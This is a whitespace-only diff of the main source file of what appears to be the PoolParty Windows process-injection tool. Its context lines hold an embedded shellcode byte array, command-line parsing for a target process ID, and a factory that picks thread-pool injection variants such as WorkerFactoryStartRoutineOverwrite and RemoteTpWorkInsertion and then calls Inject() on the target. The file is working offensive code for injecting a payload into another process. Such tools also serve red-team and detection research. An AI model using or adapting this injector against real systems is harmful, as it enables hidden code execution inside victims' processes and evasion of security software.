@@ -1,6 +1,6 @@
 #include "PoolParty.hpp"
 
-unsigned char g_Shellcode[] = 
+unsigned char g_Shellcode[] =
 "\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
 "\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
 "\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
@@ -58,7 +58,7 @@ POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
 			CmdArgs.VariantId = stoi(args.at(++i));
 			continue;
 		}
-		if (CmdArg == "-P" || CmdArg == "--target-pid") 
+		if (CmdArg == "-P" || CmdArg == "--target-pid")
 		{
 			CmdArgs.TargetPid = stoi(args.at(++i));
 			continue;
@@ -79,7 +79,7 @@ std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
 {
 	switch (VariantId)
 	{
-	case 1: 
+	case 1:
 		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 2:
 		return std::make_unique<RemoteTpWorkInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
@@ -101,7 +101,7 @@ std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
 	}
 }
 
-void InitLogging() 
+void InitLogging()
 {
 	logging::add_console_log(
 		std::cout,
@@ -121,7 +121,7 @@ int main(int argc, char** argv)
 {
 	InitLogging();
 
-	try 
+	try
 	{
 		const auto CmdArgs = ParseArgs(argc, argv);
 
@@ -134,11 +134,11 @@ int main(int argc, char** argv)
 		const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid);
 		Injector->Inject();
 	}
-	catch (const std::exception& ex) 
+	catch (const std::exception& ex)
 	{
 		BOOST_LOG_TRIVIAL(error) << ex.what();
 		return 0;
 	}
-	
+
 	return 1;
 }
